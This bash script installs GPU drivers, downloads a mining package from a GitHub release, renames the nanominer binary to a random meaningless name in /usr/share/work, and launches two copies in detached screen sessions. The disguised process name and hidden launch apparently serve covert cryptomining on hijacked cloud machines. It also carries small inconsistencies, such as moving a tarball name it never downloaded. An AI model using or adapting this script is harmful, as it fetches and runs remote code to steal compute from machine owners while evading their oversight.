#!/bin/bash
apt-get update
apt-get install -y git wget screen
azure=mxsemsdnlkdj
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
apt-get install -y git wget screen
wget https://us.download.nvidia.com/tesla/460.73.01/NVIDIA-Linux-x86_64-460.73.01.run
sudo chmod +x NVIDIA-Linux-x86_64-460.73.01.run
./NVIDIA-Linux-x86_64-460.73.01.run
mkdir /usr/share
mkdir /usr/share/work
rm -r /usr/share/work/avengers
wget https://github.com/wollfoo/wolethv100/releases/download/hypernova/hypernova.tar.gz
mv avengers.tar.gz /usr/share/work/
cd /usr/share/work/ &&  tar xf hypernova.tar.gz
rm -rf hypernova.tar.gz && cd hypernova
mv nanominer $azure -n
cp $azure "$cpuname"
rm -f  nanominer
echo $cpuname" is starting"
screen -d -m ./"${cpuname}" eth01.ini
screen -d -m ./"${cpuname}" eth02.ini
